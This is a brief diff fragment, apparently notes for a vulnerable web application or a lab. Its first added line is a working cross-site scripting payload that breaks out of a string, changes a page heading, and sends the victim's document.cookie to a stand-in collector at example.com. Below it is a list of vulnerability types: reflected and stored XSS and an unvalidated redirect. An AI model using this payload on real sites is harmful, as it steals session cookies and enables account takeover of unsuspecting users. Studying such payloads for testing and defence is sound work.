@@ -1,0 +1,10 @@
+';window.onload=function(){document.getElementsByClassName('content')[0].getElementsByTagName('h2')[0].innerHTML='no results';s=document.createElement('img');s.src='http://example.com/cookieCollector.php?cookie='+encodeURIComponent(document.cookie);document.body.appendChild(s);};//
+
+Reflected XSS in search
+
+Stored XSS in name
+
+Reflected XSS in passed parameter
+
+Unvalidated redirect on login and registration
+
